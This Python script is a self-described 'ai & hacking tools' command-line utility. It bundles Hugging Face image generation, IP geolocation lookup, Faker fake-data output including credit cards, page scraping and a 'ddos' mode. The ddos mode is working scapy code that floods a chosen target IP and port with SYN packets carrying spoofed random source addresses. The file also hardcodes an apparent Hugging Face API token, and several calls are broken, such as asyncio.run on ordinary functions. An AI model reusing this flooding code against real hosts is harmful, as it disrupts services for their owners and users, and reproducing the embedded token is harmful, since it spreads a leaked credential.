# Import necessary libraries
import argparse
import asyncio
import requests
import io
import random
from PIL import Image
from halo import Halo
import time
from faker import Faker
import argparse
from scapy.all import *
from scapy.layers.inet import TCP, IP
from bs4 import BeautifulSoup

def generate_random_ip():
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def send_packet(target_ip, target_port, packet_size):
    source_ip = generate_random_ip()
    source_port = RandShort()

    packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags='S') / Raw(
        RandString(size=packet_size))

    send(packet, verbose=False)

def dos_attack(target_ip, target_port, num_packets, packet_size):
    sent_packets = 0

    while sent_packets < num_packets:
        send_packet(target_ip, target_port, packet_size)
        sent_packets += 1
        print(f"\rSent packet {sent_packets}", end="")

# Define global variables
API_URL = "https://api-inference.huggingface.co/models/Kvikontent/midjourney-v6"
fAPI_URL = "https://api-inference.huggingface.co/models/Kvikontent/Fingerprints-V1"
headers = {"Authorization": "Bearer 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"}
fake = Faker()
# Query function
def query(payload):
    # Send POST request to API URL
    response = requests.post(API_URL, headers=headers, json=payload)
    return response.content

# Fingerprint generation function
def fquery(payload):
    # Send POST request to fingerprint API URL
    response = requests.post(fAPI_URL, headers=headers, json=payload)
    return response.content

# Image generation function
def generate_image(text):
    payload = {
        "inputs": text,
    }

    # Initialize loading animation
    spinner = Halo(text="Generating Image", spinner="dots")
    spinner.start()

    # Get generated image from API call
    image_bytes = query(payload)

    # Check if image was returned successfully
    if image_bytes:
        spinner.succeed("Image Generated Successfully!")
        image = Image.open(io.BytesIO(image_bytes))
        image.show()
    else:
        spinner.fail("Failed to generate image.")

# Fingerprint generation function
def generate_finger(text):
    payload = {
        "inputs": text,
    }

    # Initialize loading animation
    spinner = Halo(text="Generating Fingerprint", spinner="dots")
    spinner.start()

    # Get generated fingerprint from API call
    image_bytes = fquery(payload)

    # Check if fingerprint was returned successfully
    if image_bytes:
        spinner.succeed("Fingerprint Generated Successfully!")
        image = Image.open(io.BytesIO(image_bytes))
        image.show()
    else:
        spinner.fail("Failed to generate fingerprint.")

# Function to retrieve location data
def get_location(ip_address):
    response = requests.get(f"https://ipapi.co/{ip_address}/json").json()
    location_data = {
        "ip": ip_address,
        "city": response.get("city"),
        "region": response.get("region"),
        "country": response.get("country_name"),
        "postalcode": response.get("postal"),
        "latitude": response.get("latitude"),
        "longitude": response.get("longitude"),
        "timezone": response.get("timezone"),
        "utc_offset": response.get("utc_offset"),
        "country_calling_code": response.get("country_calling_code"),
        "country_population": response.get("country_population"),
    }
    return location_data

def get_html(url):
    resp = requests.get(url)
    return resp.content

def get_css(url):
    response = requests.get(url)

    if response.status_code == 200:

        html_content = response.text
        soup = BeautifulSoup(html_content, "html.parser")

        css_links = []
        for link in soup.find_all("link", rel="stylesheet"):
            if link.get("href"):
                css_links.append(link.get("href"))

        for css_link in css_links:

            if not css_link.startswith("http"):
                css_link = url + css_link

            css_response = requests.get(css_link)
            if css_response.status_code == 200:
                resp = (f"CSS content from {css_link}: {css_response.text}")
                
    return resp

description = ("""
Poweful ai & hacking tools..
Help - kvimusic0@gmail.com

""")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=description)
    parser.add_argument("-imagine", type=str, help="Text to imagine in the image", required=False)
    parser.add_argument("-name", type=str, help="Generate fingerprints based on text input", required=False)
    parser.add_argument("-ip", type=str, help="Get full IP info", required=False)
    parser.add_argument("-fake", type=str, help="Generate fake data (name/lastname/adress/text/email/phone/date/creditCard/job/domain/paragraph)", required=False)
    parser.add_argument("-m", type=str, help="Model name to use (can be: mj, finger, ip, fake, ddos, gethtml, getcss)", required=True)
    parser.add_argument('-t', '--target', help='Target IP address', required=False)
    parser.add_argument('-p', '--port', type=int, help='Target port number', required=False)
    parser.add_argument('-np', '--num_packets', type=int, default=500, help='Number of packets to send (default: 500)', required=False)
    parser.add_argument('-ps', '--packet_size', type=int, default=64, help='Packet size in bytes (default: 64)', required=False)
    parser.add_argument("-url", type=str, help="Get something from this url", required=False)


    args = parser.parse_args()

    if args.m == "gethtml":
        print("Recieving content...")
        print("Done.")
        print(get_html(args.url))

    elif args.m == "getcss":
        print("Recieving content...")
        print("Done.")
        print(get_css(args.url))

    elif args.m == "mj":
        print(
            r"""
 __  __   _____   _____         _    ____    _    _   _____    _   _   ______  __     __
 |  \/  | |_   _| |  __ \       | |  / __ \  | |  | | |  __ \  | \ | | |  ____| \ \   / /
 | \  / |   | |   | |  | |      | | | |  | | | |  | | | |__) | |  \| | | |__     \ \_/ / 
 | |\/| |   | |   | |  | |  _   | | | |  | | | |  | | |  _  /  | . ` | |  __|     \   /  
 | |  | |  _| |_  | |__| | | |__| | | |__| | | |__| | | | \ \  | |\  | | |____     | |   
 |_|  |_| |_____| |_____/   \____/   \____/   \____/  |_|  \_\ |_| \_| |______|    |_|   
   ___                       _   _                 
  / __|___ _ _  ___ _ _ __ _| |_(_)_ _  __ _       
 | (_ / -_) ' \/ -_) '_/ _` |  _| | ' \/ _` |_ _ _ 
  \___\___|_||_\___|_| \__,_|\__|_|_||_\__, (_|_|_)
                                       |___/       
        """
        )
        asyncio.run(generate_image(args.imagine))

    elif args.m == "finger":
        print(
            r"""
  ______   _____   _   _    _____   ______   _____    _____    _____    _____   _   _   _______ 
 |  ____| |_   _| | \ | |  / ____| |  ____| |  __ \  |  __ \  |  __ \  |_   _| | \ | | |__   __|
 | |__      | |   |  \| | | |  __  | |__    | |__) | | |__) | | |__) |   | |   |  \| |    | |   
 |  __|     | |   | . ` | | | |_ | |  __|   |  _  /  |  ___/  |  _  /    | |   | . ` |    | |   
 | |       _| |_  | |\  | | |__| | | |____  | | \ \  | |      | | \ \   _| |_  | |\  |    | |   
 |_|      |_____| |_| \_|  \_____| |______| |_|  \_\ |_|      |_|  \_\ |_____| |_| \_|    |_|   
   ___                       _   _                 
  / __|___ _ _  ___ _ _ __ _| |_(_)_ _  __ _       
 | (_ / -_) ' \/ -_) '_/ _` |  _| | ' \/ _` |_ _ _ 
  \___\___|_||_\___|_| \__,_|\__|_|_||_\__, (_|_|_)
                                       |___/       
        """
        )
        asyncio.run(generate_finger(args.imagine))

    elif args.m == "ip":
        spinner = Halo(text="Getting info", spinner="dots")
        spinner.start()
        time.sleep(5)

        output = get_location(args.ip)
        if output:
            spinner.succeed("\033[92mData received successfully!")
            print("\033[92m\nLocation Data:\033[0m")
            for key, value in output.items():
                print(f"\t• {key} : {value}")
        else:
            spinner.fail("Unable to fetch information.")

    elif args.m == "fake":
        if args.fake == "name":
            print(f"\033[92m{fake.name()}")
        elif args.fake == "adress":
            print(f"\033[92m{fake.adress()}")
        elif args.fake == "text":
            print(f"\033[92m{fake.text()}")
        elif args.fake == "email":
            print(f"\033[92m{fake.email()}")
        elif args.fake == "phone":
            print(f"\033[92m{fake.phone_number()}")
        elif args.fake == "date":
            print(f"\033[92m{fake.date()}")
        elif args.fake == "creditCard":
            print(f"\033[92m{fake.credit_card_full()}")
        elif args.fake == "job":
            print(f"\033[92m{fake.job()}")
        elif args.fake == "domain":
            print(f"\033[92m{fake.domain_name()}")
        elif args.fake == "paragraph":
            print(f"\033[92m{fake.paragraph()}")

    elif args.m == "ddos":
        target_ip = args.target
        target_port = args.port
        num_packets = args.num_packets
        packet_size = args.packet_size

        dos_attack(target_ip, target_port, num_packets, packet_size)

    else:
        raise ValueError("Invalid model provided. Use -h to see how to use.")